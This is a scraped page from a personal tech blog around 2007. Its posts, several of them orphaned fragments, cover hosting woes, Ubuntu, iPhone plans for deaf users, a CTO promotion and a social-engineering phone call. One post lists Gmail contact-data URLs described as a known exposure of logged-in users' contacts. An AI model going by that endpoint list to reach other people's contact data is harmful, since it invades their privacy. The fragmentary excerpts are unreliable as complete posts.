<p>We were scheduled to present on smart choices in small IT. However, that didn&#8217;t really go as we had planned. We got as far as creating an initial presentation of the small IT ideas - but we didn&#8217;t feel right presenting something so dry at the end of this event. We thought that most of the people are gunna be a bit intoxicated and probably won&#8217;t care that skinnycorp uses google apps. (If you think you might care - i suggest you check out <a href='http://www.morefishthanman.com/2007/12/03/the-5-smartest-things-you-can-do-in-small-it-right-now/'>Scott's blog on the subject</a> - it is a culmination of our talks and the basic outline for our planned presentation. ) So with this in mind, we gave up on doing a serious presentation and decided to just rock out in our typical guerrilla humor way.</p>
<a href='http://docs.google.com/TeamPresent?docid=dd3wvxq5_43gq3g4x'>So here is our presentation</a>

                <p>Man. <a href='http://www.tuaw.com/2007/11/29/atandt-puts-the-kibosh-on-voice-free-iphone-plans-for-the-deaf/'>This</a> really gets my goat.</p>

<p>I have always had an interest in accessibility of technology by people who are differently abled, but i usually concentrated on seniors and children. It never occurred to me the challenges that a deaf person would have interacting with mobile phones and all that (I mean - i was aware that such challenges existed, i just never interacted directly with someone who had experience). About 6-8 months ago i met this guy <font size='3'>Brendan </font>at a conference. He had a sidekick, was deaf and was talking the shit out of some peeps on the sidekick. He showed me how he used an IPrelay to talk to peeps on phones. It was neat, impressive and probably an unexpected side effect of having such a message centric device.</p>

<p>We talked a bunch about how the sidekick + iprelay is awesome. And eventually we talked about the upcoming iphone release. He was super excited - because apple has been so friendly to the Deaf Community, and the promises of a messaging centric Apple handheld telecommunications device was quite alluring. The deaf community was abuzz with talk about the upcoming phone and whether or not it would break the reign of the sidekick as being the best device for deaf folks.</p>

<p>There was quite a bit of <a href='http://www.deafmac.org/blog/?p=169'>hype</a>, <a href='http://www.deafmac.org/blog/?p=100'>talk</a>, <a href='http://www.deafmac.org/blog/?p=113'>and</a> <a href='http://www.deafmac.org/blog/?p=112'>various</a> <a href='http://www.deafmac.org/blog/?p=109'>posts</a> on <a href='http://www.deafmac.org'>deafmac.org</a> about the iphone. This is where i started to pay attention. It was obvious that the deaf community was dealing with a different beast. Apple had closed the iphone - pretty much making it lamer than it had to be. They didn&#8217;t ship with a lot of the functionality that could have made it a dream machine for the deaf community. But people like Brenden kept at it - not giving up and dealing with the nuances of having an always on the web device.</p>

<p>One of the things i discovered while talking about all this nonesense is that the carriers usually offer a plan that is data/messaging centric with very little concentration on a voice for their deaf consumers. This seemed awesome. But AT&#38;T didn&#8217;t offer such a plan for the iphone. And now they are officially saying that they don&#8217;t plan on ever offering one. You can read more about this over at <a href='http://www.tuaw.com/2007/11/29/atandt-puts-the-kibosh-on-voice-free-iphone-plans-for-the-deaf/'>TUAW</a>.</p>

<p>It seemed that their reasoning was that &#8220;it wasn&#8217;t fair to the non deaf community.&#8221; How annoying. The Deaf users of the iPhone have to pay for a number of unused voice minutes that they probably won&#8217;t use just to get the messaging platform they need. AT&#38;T seems to think that the people who are using this data only plan are not the Deaf community members, but randoms who just want to use it as a internet device.</p>

<p>Well, shouldn&#8217;t this tell AT&#38;T something? I mean - instead of alienating a group of people who just want to use the iphone as it was meant to be used: a communicator - shouldn&#8217;t AT&#38;T realize (like tmobile did with the sidekick) that the iphone is more than a phone and that people WANT to use it however they want?</p>

<p>It just kills me when i hear stuff like this. AT&#38;T is at the top of the market. But i hope that moves like this reverberate through their consumers and drop them a bit. Especially with <a href='http://www.nypost.com/seven/11282007/business/verizons_open_door_331877.htm'>Verizon opening it's network</a> and <a href='http://code.google.com/android/'>Google's Andriod</a> - maybe consumers (and consumers with different needs) will be able to get a device which suits them and doesn&#8217;t cost them more than it should.</p>

                <p>I am a linux mad man recently. I was noticing today that almost all of my devices i enjoy using are unix and mostly linux based. Pretty insane. So with that thought i decided to unshackle myself from the man and attempt desktop linux for the first time.</p>

<p>I am scared. Hold me!</p>

<p>I am currently installing Ubuntu on my laptop. 7.04 didn&#8217;t boot on this guy - but 7.10 rocks pretty hard. So i am not yet disappointed. I am hoping that i will not need anything SUPER windowsy for awhile. And if I do - I am just going to install windows in either qemu or vmware. We shall see.</p>

<p>Honestly, I want a macbook.  I love OSX. I love the general usability, and the ease that everything works together. I love the app integration. I am absolutely in love with Address Book. I love making my contacts better and better. I hope to have EVERYONES email and phone. ;) But i don&#8217;t like how it obfuscates all the fun unixy parts. I wish it had a better package manager. I wish it was easier to dig into the trenches without getting into the darwin version of dll hell. But, I am not soo worried.</p>

<p>I  am addicted to debian&#8217;s package manager. From playing around on my fancy new ubuntu/debian servers to playing around with my various desktops i have played with. I have found the secret to linux. NEVER COMPILE ANYTHING. seriously. wth was i thinking back in 93. compiling all this shit all the time. that was bullshit. The new new is the way to be. I am dead serious. If i had a choice for running a server. it would be debian - based purely on the broad scope of packages that are in apt. And then if it isn&#8217;t in apt, i am easily able to find a .deb of the package. Rock. RPM&#8217;s can suck it (that&#8217;s right rackspace.. better watch out! I may change everything to debian at a moments notice!).</p>

<p>I love disto wars. Ma. I remember when Atkins and I were trying to decide whether to use slackware or yggdrasil linux. back in the day. we usually went with slackware. Then redhat came out and blew our minds. Then we didn&#8217;t care. until now!</p>

<p>Oh the struggle!</p>

<p>I am pretty happy that these are the worst things happening right now in my life. Which unix derivative to use for a desktop. ;) Rock On!</p>

                <p>Happy thanksgiving!</p>

<p>It has been a long and lazy day today. Pretty awesome. We are about to head out to a party at our friend Jill&#8217;s house. it should be fun. There were so many options this year. Quite a <a href='http://callmejeffrey.com/'>few</a> <a href='http://morefishthanman.com/'>people</a> offered to include us in their families thanksgiving - it was a hard decision. I just picked the first one. haha. (and hopefully the one with the best food - as the hosts are all chefs at various places around the city).</p>

<p>Friends are awesome.</p>

<p>We miss our families, but will see them soon.</p>

<p>So happy thanksgiving to everyone.</p>

                <p>For the first time in almost 7 years my servers are offline.</p>

<p>I just shut them down. It was pretty sad. They were good servers. They did a lot of traffic. They were slashdotted, dugg, reddited, and probably any other sited that was hot shit in the last 6 years.  I installed them when my dedicated host died in early 2001. Originally I just shipped them a box, which they hooked up. The original box was a VA Linux box from their fire sale. It owned. I paid 200 a month for unlimited transfer. At that time I was doing about 25G a day in transfer. heh. Then in 2003, I bought a bundle of hardware to upgrade my infrastructure and added a firewall, a super fast switch and another server. With all this fanciness I was able to pull an average of about 120G a day&#8230; for 3 years straight. Which I think is around 130 terabytes. I guess that is what i get for hosting shady content. ;)</p>

<p>So now I embark on a new style of hosting. A mix of hardware, shared and virtualized.  I have a box at <a href='http://leaseweb.com/'>leaseweb</a>, a demo box at <a href='http://mediatemple.net/'>mediatemple </a>(it is pretty dope), a bundle of stuff at <a href='http://mosso.com/'>mosso</a> and then a handful of sites sprinkled around ec2. It makes me sad to not have full control of my sites. I am bummed that mosso doesn&#8217;t offer SSH. I am worried that my hosting cocktail will not handle my needs and that I will be hit with crazy overages. I can&#8217;t afford a 10k hosting bill. that would be annoying.</p>

<p>When i think how this hosting plan is how most people host stuff, I can&#8217;t imagine their pain. Through managing my own boxes, I learned SO much. I fought hackers (both brazillian and korean). I fought lawsuits. I fought clients and users. I learned how to manage load, how to scale php, how to work out kinks in a cheap infrastructure and all the fun tricks that got me to my job at threadless. But most of all I learned that I really love linux and open source software.</p>

<p>I will miss you servers! Peaces!</p>

                <p>Since Google just changed the game of mobile software - I got to thinking about my new fascination - Contact management. So the first place I go to is Gmail and <a href='http://lifehacker.com/software/sneak-preview/gmail-speeds-up-improves-contacts-316673.php'>Google's new contact manager</a>. Being an <a href='http://en.wikipedia.org/wiki/ISync'>iSync</a> freakout, I love syncing my contacts. I LOVE being able to bring in contacts from all my different sources and see them mix with my current contacts. I LOVE finding duplicates and merging then. God I am a dork. So recently, Google released a new contact manager into Gmail&#8217;s across the world (If you don&#8217;t have it, you probably will soon) - so I was excited to try out the import export pieces to see how well it works/goes. fun fun. here are most of my notes.</p>

<p>First off some history. So there is a pretty <a href='http://googlesystem.blogspot.com/2007/01/gmail-contact-list-exposure.html'>well documented "hole" in the old Google contact manager available in Google video</a>. I say hole because some people claim its a security concern. It is. But I don&#8217;t think it is too big of concern. It requires a legit cookie and active session. I imagine through some reflection and other security nonsense - bad things could happen. But i am happy it is exposed.</p>

<p>If you go to: <blockquote><a href='http://video.google.com/contacts/data/contacts?thumb=true&amp;groups=true&amp;show=PICKER&amp;enums=true&amp;psort=Name&amp;max=300&amp;out=js&amp;rf=Emails&amp;jsx=true'>http://mail.google.com/mail/contacts/ui/ContactManager? js=RAW&amp;maximize=true&amp;hide=true&amp;position=absolute&amp;hl=en&amp;border=NONE</a></blockquote> You will get a list of your contacts in XML. You can add various things onto the query string to change the output to js (<a href='http://video.google.com/contacts/data/contacts?thumb=true&amp;groups=true&amp;show=ALL&amp;enums=true&amp;psort=Name&amp;max=500&amp;out=js&amp;jsx=true'>out=js</a>), change the sort order (<a href='http://video.google.com/contacts/data/contacts?thumb=true&amp;groups=true&amp;show=ALL&amp;enums=true&amp;psort=Email&amp;max=500&amp;jsx=true'>psort=Email</a>, <a href='http://video.google.com/contacts/data/contacts?thumb=true&amp;groups=true&amp;show=ALL&amp;enums=true&amp;psort=Name&amp;max=500&amp;jsx=true'>psort=Name</a>) and I am sure there are others as well.</p>

<p>So from here we move onto Gmail and the new contact manager. First off, you can easily find the new xml/js stream of your contacts: <blockquote><a href='http://mail.google.com/mail/contacts/data/contacts?show=ALL&amp;out=js'>http://mail.google.com/mail/contacts/data/contacts?show=ALL&amp;out=js</a></blockquote> This is (apparently) all your contacts. Take away the &#8221;&#38;out=js&#8221; if you want to see the <a href='http://mail.google.com/mail/contacts/data/contacts?show=ALL'>easier to read XML version.</a></p>

<p>So now the magic part of it all! Access to the raw Contact Manager. You do not have to physically in Gmail to access it. Just visit this easy to remember URL: <blockquote><a href='http://mail.google.com/mail/contacts/ui/ContactManager'>http://mail.google.com/mail/contacts/ui/ContactManager</a></blockquote> You now have access to the new contact manager for Gmail (even if your Gmail account doesn&#8217;t have access). You can also access this from a Google Apps account as well: <blockquote><a href='http://mail.google.com/a/nata2.org/contacts/ui/ContactManager'>http://mail.google.com/a/nata2.org/contacts/ui/ContactManager</a>?</blockquote> Pretty easy!</p>

<p>From here you can handle all the goodness of importing and exporting your contacts to real formats. You can add real contact info. You can import from a bundle of different places and finally get your Gmail address book under control.</p>

<p>Sadly, there is not an &#8221;<a href='http://code.google.com/apis/gmail'>official</a>&#8221; Gdata rest API for Google contacts, however with the recent announcements and with <a href='http://code.google.com/apis/opensocial/'>OpenSocial</a>, I can&#8217;t imagine it being far behind.</p>
<strong>Extra Credit: </strong><blockquote><a href='http://mail.google.com/mail/photos/email@address.com' title='http://mail.google.com/mail/photos/email@address.com'>http://mail.google.com/mail/photos/email@address.com</a></blockquote>
<p>So the trick is to just append the email address to the url: <a href='http://mail.google.com/mail/photos/' title='http://mail.google.com/mail/photos/'>http://mail.google.com/mail/photos/</a></p>

<p>So for me you get: <blockquote><a href='http://mail.google.com/a/nata2.org/photos/harper@nata2.org'>http://mail.google.com/a/nata2.org/photos/harper@nata2.org</a></blockquote> That is the picture of me for my Google Apps account. If you want it in Gmail go to: <blockquote><a href='http://mail.google.com/mail/photos/harper@nata2.org'>http://mail.google.com/mail/photos/harper@nata2.org</a></blockquote> <font color='#40454b' style='background-color: #ffffff'>This is obvious a helper URL to easily get contact pictures in Gmail. You just replace the email address in the above URL with your own and you will get the picture. You could probably roll your own simple <a href='http://site.gravatar.com/'>Gravatar</a> like service using this info!</font></p>

                <p>I have been working at <a href='http://skinnycorp.com'>skinnyCorp</a> for about 2.4 years. We have grown a lot in that time. It is really cool to think about. When I started, we had 3 servers, a lot of traffic and were selling quite a few shirts a day. Now, we are approaching 40 servers, a veritable ass load of traffic and we are selling a lot of shirts. It has been awesome to be a part of growing the technology behind <a href='http://threadless.com'>Threadless</a> in a pace that matches the community.</p>

<p>It has been a great 2.4 years. So you can imagine how excited I was, when <a href='http://jakenickell.com'>Jake</a> and <a href='http://callmejeffrey.com'>Jeffrey</a> asked me if I wanted to be CTO of skinnyCorp. I smiled. Did a guitar kick. Said yes. and went back to work ;)</p>

<p>Part of my new position will be leading skinnyCorp and threadless to having a more public technology face. I hope to see more of you at conferences, and with luck, I will be able to talk about the cool stuff we are doing here at skinny.</p>

<p>I can&#8217;t wait to see where we will go in the next couple months, years. It will be fun to grow Threadless to wherever our community takes us. And it will be awesome to be a part of whatever tricks we have up our sleeves in the coming months. Stay tuned for some cool stuff.</p>

<p>Btw, We are looking for a mysql rockstar. Someone who is bad-ass and doesn&#8217;t mind being called a DBA. So if you are that person (or know someone) - <a href='mailto:harperr+mysql@skinnycorp.com'>send me an email</a>.</p>

                <p>Pretty insane. <a href='http://torrentfreak.com/oinkcd-servers-raided-admin-arrested/'>Oink has been raided and the owner has been arrested</a>.</p>

<p>Oink was a really neat tracker. It was apparently fast, clean and super easy. Apparently it was the biggest private bittorrent tracker. Around 180k users. That is a lot of dedicated users.</p>

<p>It taught a bunch of people I know about bittorrent. It was used by anyone from joe smoe to actual musicians. It was a huge music community.</p>

<p>It is a bummer that it is gone. But I imagine something better will pop up shortly. What a sad day for music.</p>

                <p>Today I found out that my dad was placed into the hospital to help him fight his infidel skin. Basically he has what is colloquially known as &#8220;extreme eczema,&#8221; but basically it seems that his skin is attempting to hijack his body and run it into a building. So with that in mind, he went to get himself checked out.</p>

<p>During his check out, the doctor was like &#8220;OMG. Yours skin is at terror alert red. you need to check yourself in immediately. &#8221; and so he did.</p>

<p>Needless to say, my mom was pretty upset by this. My parents like each other (So strange in this day and age) and they don&#8217;t spend a lot of time apart. So my dad being away is hard. and now that he is away and in a hospital - it is a bit stressful.</p>

<p>She called and asked if I would come down with her. I wasn&#8217;t sure because i was supposed to go to this conference. So I checked around to see if any of my other siblings were able or near. I first called Dylan - but him being the only Reed left at the family company - he had to stay and hold down the fort. Apparently there were a bunch of fires he had to but out. So i called our brother from another mother - Jon. And this is where the story gets fun.</p>

<p>I call Jon and say &#8220;Jon, What are you up to.&#8221; Jon in his typical fashion tells me that he is just getting down from a redwood tree and is in California, but making his way to Portland. This is hilarious. I tell him the situation and he is pretty bummed, and can make it out on Thursday. So i tell him i will get back to him.</p>

<p>I then talk to my mom and mention that Jon is in some trees and can come out if she wants. So she tells me that I should &#8220;Tell him to stay in his tree.&#8221; Heh.</p>

<p>Damn hippies.</p>

<p>So anyway. I will be flying out to meet my mom and help support the family units for the next few days. Hopefully I will be able to get some awesome work done and explore the Hogwarts like world that is the hospital.</p>

                <p>Awhile ago I got this email from a friend. It is about the Medical Marijuana problem with Iraq veterans. I thought you guys might like to read it. So here it is: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;I just read the article you posted about medical marijuana and veterans and it definitely was intense.  Its a shame that they are not getting taken care of.  That particular guy says that there were no nightmares and his limbs were intact, which is very lucky.  I have friends that came back from Iraq in the last year or so and it is scary to see the change.  First off, only one of them has agreed to come out and interact with us again.  My friend John is a Marine and was stationed mainly in Ramadi.  John had always been an interesting character, but since Iraq he has lost all innocence.  He&apos;s still very spontaneous and wacky, but in a very bitter way.  He acts as he does because he&apos;s so angry that popped collars walk around thinking that they are kings, and John is not treated as a king coming back home.  He won&apos;t talk about most of what happened over there, only few of the fonder memories. His best friend was basically blown up in front of him, leaving a wife and child in California.</pre></p>

<p>One particular weekend, John and I went to CU to visit my now ex. Very stressful nights that weekend. John got shit ass drunk as quickly as possible and yelled at everyone on the streets for being able to enjoy their 20 something years. We got kicked out of two bars in half an hour, then John decided to disappear for the rest of the night. He&#8217;d come back in one hour, two hour, three hour intervals and take off again.</p>

<p>Talking to him on the ride there and back was ridiculously difficult. Making small talk was pointless, and talking about Iraq was too personal. Every time he came back home he pulled the same disappearing act, completely disregarding the fact that we were worried about him.It just broke my heart to see how badly he wished he was still naive. He was sent to Iraq for a second trip, and I have since lost contact with him or friends that would know where he was. That article totally hit a sore spot in my heart for these guys out there. In no way am I a supporter of the war or the military, but I completely support the individuals that decide to put themselves into the military. This line from the article, &#8216;My wife was the love of my life, the girl I wanted to spend the rest of my life with, but when I came back from Iraq, she was now a complete stranger to me, as I was to her.&#8217; is an issue that most vets deal with, its really fucking sad.&lt;/blockquote&gt; Yep. Its insane how the government is creating a state of war that most people don&#8217;t want, then not supporting the troops as much as they need to be supported. We need this to stop.</p>

                <p>Legally of course.</p>

<p>But everyday I am discovering new music and listening to interesting artists. The internet is awesome. I can&#8217;t really imagine what it would be like without it. I mean, I am able to think to myself &#8220;I would like to learn about classical music&#8221; and find a place that is offering an entire concert public domain.</p>

<p>it is great to see various modern artists like <a href='http://en.wikipedia.org/wiki/Trent_Reznor#Nine_Inch_Nails'>Trent Reznor</a> and <a href='http://en.wikipedia.org/wiki/Radiohead'>Radiohead</a> abandoning Record labels and their past worlds and welcoming the new musical overlords.</p>

<p>Btw, I would like to learn about classical music. I am looking for something dark and brooding. Any ideas?</p>

                <p>I just read this article. It is about an Iraq Veteran and his battle with post-traumatic stress. Pretty intense - but worth reading. You can check out the article <a href='http://www.esquire.com/features/esquire-100/essay1007'>here</a> - even better, read the <a href='http://www.esquire.com/print-this/essay1007'>full version here</a>.

                <p>I sit on IRC quite a lot. Most of the time in #corporate on efnet. I have been there pretty much everyday for the last 5 years. Kind of insane. I love shells. anyway, in the past couple months some friends and i were talking about starting another channel. So we brainstormed some channel names. Then i squatted in a couple of them to see what kind of people came in. We didn&#8217;t want something that people were regularly joining or using. We wanted something fresh but easy to remember.</p>

<p>Tonight i was sitting here, minding my own business when someone comes into #hot (a horrible name, but one we talking about) and just starts talking away. The funny thing is that there is nobody but me and a bot in the channel. And we have similar nicks - so if you were on IRC for more than a couple minutes you would realize that at least one of us is not real. So this guy jumps into the channel and says: <blockquote>23:30|starbosa (~hh@166.240.221.203.dial.dynamic.acc09-kent-syd.comindico.com.au) has joined channel #hot
23:31|&lt;starbosa:#hot&gt; you must be encridibley thick, i'm the dominant one here
23:31|&lt;starbosa:#hot&gt; be yourself, be ziad, stop copying other people
23:31|&lt;starbosa:#hot&gt; i'm seeing other people right now
23:31|&lt;starbosa:#hot&gt; i'm beeing myself
23:32|&lt;starbosa:#hot&gt; that's why you copy people, you're not creative
23:33|&lt;starbosa:#hot&gt; you're being too emotional, so i'm going to change the subjet, it's irrelvent
23:34|&lt;starbosa:#hot&gt; a real man is creative, he knwos himself
23:39|&lt;starbosa:#hot&gt; a real man is creative, he  doesnt copy others
23:41|starbosa has left channel #hot
23:41|starbosa (~hh@166.240.221.203.dial.dynamic.acc09-kent-syd.comindico.com.au) has joined channel #hot
23:43|&lt;starbosa:#hot&gt; ziad i said be yourself
23:43|&lt;starbosa:#hot&gt; i'm seeing other people, thats why u copy cause you're not creative
23:44|&lt;starbosa:#hot&gt; you are prone to copy, cause u're not creative
23:47|&lt;starbosa:#hot&gt; that doesnt make u a man
23:49|&lt;starbosa:#hot&gt; you copy cause you're not an arab like, so thats not who u really are, you can barely speak arabic
23:56|&lt;starbosa:#hot&gt; you're in a state of turmoil, how can you be taken seriously
00:09|&lt;starbosa:#hot&gt; ziad can't overwhelm a fly, it's just that you're not being yourself
01:06|Signoff: starbosa (Read error: Operation timed out)</blockquote> Heh. No idea whats going on. But it was very entertaining. I feel like he was breaking up with my bot. maybe my bots real name is zaid. I do know that my bot is terrible at arabic. So that is probably it.</p>

                <p>I thought I would give a rundown of some&nbsp;of the books I have been reading recently. In the last couple weeks, I have been interested in non-fiction reading.&nbsp; I go through phases were I am suddenly really into books on different sociological issues. For instance, the <a href='http://www.nata2.org/2006/10/16/shutting-out-the-sun-an-interesting-book-about-japan/'>hikikomori book I read awhile ago</a>, and my fascination with any book that is about Chicago and Urban issues. So anyway - I will tell you what I have been reading and what I am in the middle of. </p>

Whatever it is - I really like how the <a href='http://www.bikez.com/motorcycles/sachs_madass_50_2007.php'>Sachs Madass</a> looks. Today at lunch we were walking down Broadway and saw one locked up.

Too bad summer&nbsp;is ending so soon - I would be tempted to use some adsense monies to scoop one up (although hiromi would probably want one too - then we would be the baddest assed scooter gang who is also married and really awesome). </p>

It was fun. It was a party a year in the waiting. We had a ton of friends come and had some really nice parties at my parents house. Only a little bit of mayhem and pretty much an awesome time all around. </p>

When I use my computer, I want to be around people. If Hiromi is in the living room, I want to hang out with her while I code or do <a href='http://fukung.net'>whatever</a>. But that often means sitting on the couch with my laptop. We have a pretty nice couch - nothing too fancy, but it is comfortable and good for sitting. But it makes you slouch. Which in turn makes my posture while using the computer very very bad. Which in turn makes me cry out in pain every hour and forty minutes. Which in turn makes Hiromi uneasy (just kidding. I don't cry out. but I probably do complain). </p>

I have been reading the <a href='http://freakonomics.blogs.nytimes.com/'>freakonomics blog</a> for a year or so - and I decided I finally needed to read the book. I enjoy Stephen&nbsp;Levitt's discussion of things that I never thought about. I especially liked the chapters about Chicago gangs. <a href='http://www.iserp.columbia.edu/people/venkatesh.html'>Sudhir Venkatesh</a> was amazing. I can't imagine what it was like to study and hang out with the <a href='http://en.wikipedia.org/wiki/Gangster_Disciples'>Gangster Disciples</a>. </p>

I have enjoyed going to the shows since I started in 92. There were a few rough spots here and there (I.e. after 98) but lollapalooza has turned out to be an amazing event. And its even more amazing that it is a HUGE event in Chicago. Awesome. </p>

                <p>My Comcast cable Internet&nbsp;has been out 4 times in the last 2 months. It is killing me. When speakeasy used to go out (very rarely), I would call them and they would fix it. I never had to have a technician come to my home and check out my DSL modem. But with Comcast, every problem - even when they admit that it is probably in the wiring leading to the house - they insist on sending a technician and wasting my time.&nbsp; Why do they insist on wasting peoples time?</p>

<p>I don&#8217;t have a lot of fancy things. No <a href='http://en.wikipedia.org/wiki/Moleskine'>moleskine</a>, no camera and no iPhone. But I do have <a href='http://en.wikipedia.org/wiki/Burt%27s_Bees'>burt's beeswax</a> - which everyone has. Hilarious.</p>

<p>When I posted my picture. I think there were around 80 pictures - now their are 280. awesome. Social software may catch on!</p>

                <p>Yesterday my friend Bryce was in town for the FBLA national meet. Pretty cool. We walked all over Chicago and I made sure we swung by the Apple store to check out the iPhone. Pretty nifty. I don't know if it is a replacement for a smartphone - but it certainly is swell. The maps and text application are both really nice. I like the text app better than the treo. Both blow the defaults on the S60 devices out of the water. </p>

                <p>So. A neat thing happened to night. Crackers just tried to social engineer me out of a ftp passwd based on my whois record. Fun Fun. They called and told me that their had been an incident and they were resetting my ftp password for my server. The only issue was that their research was a bit off. But it was a interesting situation.</p>

<p>I wonder how much this happens. And i wonder if my server is for some reason under attack. I imagine it is. Man. Sometimes the Internet is annoying.</p>

<p>Ok. Back to bed. or maybe back to figuring out why my server is being attacked at 2am by UK crackers with voip tricks. Man. They even had a call back number in the states. i wonder if it was an ipkall number? heh. probably. I don&#8217;t remember what it was. I need to remember to record these calls.</p>

<p>I guess the bottom line is - always call back before giving sensitive info - and make sure you call a number you already know. scary. heh. <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:07f8201b-d896-441d-8257-742675e5fdf9' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]amazing, crackers, social engineering, hilarious, scary[/tags]</p></p>

So I call up and they tell me that they need to send a tech. So Friday I take off from work. The tech doesn't show. They claim he did show. long story short - I have no internet still. I am so mad. So anyway, hiromi and I have been stealing internet from neighbors and random cafes and what not. However, it is a pain - cuz our entire network is set up to work together. If we are stealing internet, we can't play music over itunes. We can't see our mp3s. and generally - life is less good. hahah. So I decided to take one of my extra WRT54G APs and solve the problem. </p>

            </div>
            <div class="PostContent">
                <p>I <a href='http://www.nata2.org/2001/07/10/Goddamn_Hosting_Providers/'>hate</a> <a href='http://www.nata2.org/2001/07/10/Hosting__/'>web</a> hosting. I really do. I think that hosting is one of the most annoying parts of having web apps. It is hard to do. it is hard to manage. It is always more expensive that it needs to be. And it is constantly breaking in ways that severely damage whatever app is hosted on it. However, I have been lucky.</p>

<p>Since 2001, I have had boxes hosted in a collocation environment at <a href='http://www.osc.edu/oarnet/'>OSU</a>. They have held 4 boxes for me and have enabled me to bring countless boxes to life. For the longest time, I would read about peoples experiences with <a href='http://www.google.com/search?q=dreamhost+sucks'>dreamhost</a> and <a href='http://www.google.com/search?q=mediatemple+sucks'>mediatemple</a> and just laugh. I didn&#8217;t have any of the problems they did. I didn&#8217;t have to pay for bandwidth, I didn&#8217;t have to pay for a rack. There was no overages of any kind. It was all one lump sum a month and I could do pretty much whatever I wanted to do with that.</p>

<p>It allowed me to create a couple websites that I would not be able to host anywhere due to the insane bandwidth usage of the sites. I was able to create a repository of 9/11 media. And then run about 90g a day in bandwidth hosting that media. I was able to be <a href='http://en.wikipedia.org/wiki/Slashdotted'>slashdotted</a> and dugg without noticing or having my box be effected. I was able to learn and experiment with new technologies and what not. It was awesome. I even made money every once and awhile.</p>

<p>However, I was paying an assload of money for all this - and I needed to cut some costs. So I decided to drop a box and find another host.</p>

<p>So I found Mosso. <a href='http://mosso.com'>Mosso</a> is awesome. Well, I guess I should say that they seem like they are awesome. They offer a dream of a hosting solution: 100 bucks - 80g of space, 2000mb of transfer. perfect. I can place all my smaller sites on one account and rock it out. It was cheaper than my colo box and it had more space. And the customer service was amazing. Plus it was <a href='http://rackspace.com'>rackspace</a> backed - whom I love. So I was <a href='http://www.inlikeflynn.com/'>in like flynn</a>. However, they sucked. Seriously. My sites have been down. Then email is slow. You should see the <a href='http://www.webhostingtalk.com/showthread.php?t=492340'>message boards</a>. People are not happy. I will point you over to Derek who is <a href='http://derek.broox.com/mosso-sucks-i-need-a-new-host/'>totally fed up and has detailed a bit more of the issues</a>. It is annoying - cuz they seem like a perfect solution.</p>

<p>So this bring me to this week. On Monday, I received word that the colo I have been with since 2001 is closing. They are shutting their doors for bigger and better things. It is rather sad. almost 6 full years hosted there. A lot of money and a lot of memories. I have gotten many a job and many a gig based off my work in that environment. I am scared to leave that flexibility. But I have to.</p>

<p>And since Mosso sucks and is dying, I don&#8217;t have that to fall back on.</p>

<p>So what do I do. I am thinking about seeing looking to rackspace and seeing if I could afford a single box with their managed server division. or maybe splitting a bigger single box with Derek. I am not sure. All I know is that I can&#8217;t afford the money that real collocation costs and I can&#8217;t afford the inflexibility that shared hosting costs. Maybe in the time that I find a solution Mosso will solve all their problems. <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:57106c2b-3bb9-4a1c-9ae0-9b6a7f6b2719' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]mosso, rackspace, collocation, hosting, oar.net[/tags]</p></p>

You attempt to capture your opponents bases and kill their men. I have never before gotten so many instant messages declaring "I am in your base, killing your dudes." So we played weewar a bunch. For about a week we played. I invited all my friends, played an assload of games - got destroyed, and then I got bored. </p>

                <p>So I decided to jump in and write a facebook application. It was really fun and pretty easy. For those of you who haven't been following this, <a href='http://facebook.com'>Facebook</a> released <a href='http://developers.facebook.com/get_started.php'>development kit</a> for their site that allows third parties to develop applications that reside inside of facebook's website. It is pretty nifty. </p>

                <p>When hiromi lived in Tokyo, she had this amazing service that delivered produce and whatnot&nbsp;every week in the form of a somewhat blind box. It was great.

Well for the past couple weeks, whenever someone mentions jabber, gtalk or xmpp or whenever I start thinking about those topics - I feel like I have some idea that is stuck in my head. Its killing me. Seriously. All I do is think about writing code that integrates jabber with this, or with that - however nothing satisfies or helps me find the stuck idea. I guess I need to start hacking away a bit more. </p>

Seriously. They are scamming people left and right. It is insane how much tickets are. Today - hiromi and I decided to go see Jon Stewart at the Rosemont Arena.&nbsp;I jumped online and found that they were selling tickets at TicketMaster. I immediately was scared of how much they were going to be, but we really wanted to go. So I went through the process of ordering them. And $126.25 later we have tickets. Now the tickets were 50 each. So I expected $100. But why is it an extra 25 bucks for processing fees? What is worse is that their are not very many reliable or used alternatives to TicketMaster. so we have to deal with their overcharging - or not go to these events. It blows.</p>

            </div>
            <div class="PostContent">
                <p>So I am in the market for a new laptop. I am currently using a <a href='http://www.anandtech.com/mobile/showdoc.aspx?i=2296'>Dell Inspiron 700M</a> which I purchased a couple summers ago when I was doing freelance work. It has been a really good laptop and has gotten a lot of stuff done. So now that the customary 2 years has past, I am feeling the itch to upgrade to faster, cooler and much better machine.</p>

<p>My laptop is my primary computer. I used to use a desktop as my primary computer - but those days have past. Anymore, I can&#8217;t deal with having one location for my computing. I need to be able do work anywhere. I really have no idea what the future brings. I am always suddenly traveling. From going to random places for skinnyCorp to <a href='http://flickr.com/photos/natatwo/sets/72157594444547976/'>visiting new relatives in japan</a>. Nobody knows what&#8217;s going to happen in 2 months! I may go to Guam to meet with a guamish collocation facility to host our new guamish extratasty site.</p>

<p>In regards to my laptop use, I primarily use windows apps that connect me to Linux boxes where I do all my work. My desktop IDE is <a href='http://www.eclipse.org/'>Eclipse</a> and my default text editor is <a href='http://www.vim.org/'>VIM</a>. I spend most of my computing time in <a href='http://getfirefox.com/'>firefox</a> and in <a href='http://www.chiark.greenend.org.uk/~sgtatham/putty/'>putty</a>. I rarely use photoshop. So for the most part, I am OS agnostic. I think I could get away with a <a href='http://penguinpetes.com/b2evo/index.php?p=264&amp;more=1&amp;c=1&amp;tb=1&amp;pb=1'>Linux desktop</a>, or a OSX desktop. I would like the ability to boot windows occasionally, but I have no need for it to be my primary OS. In fact, regardless of what I choose - I am going to be attempting to use <a href='http://www.ubuntu.com/'>ubuntu</a> as the default OS (at least for a minute).</p>

<p>So here is my quandary. Do I get a <a href='http://shop.lenovo.com/SEUILibrary/controller/catalog.workflow:category.details?current-catalog-id=12F0696583E04D86B9B79B0FEC01C087&amp;current-category-id=19C791A03AF24034A0011B825513BCED'>Lenovo/IBM T60</a> or a <a href='http://www.apple.com/macbook/macbook.html'>black macbook</a>?</p>

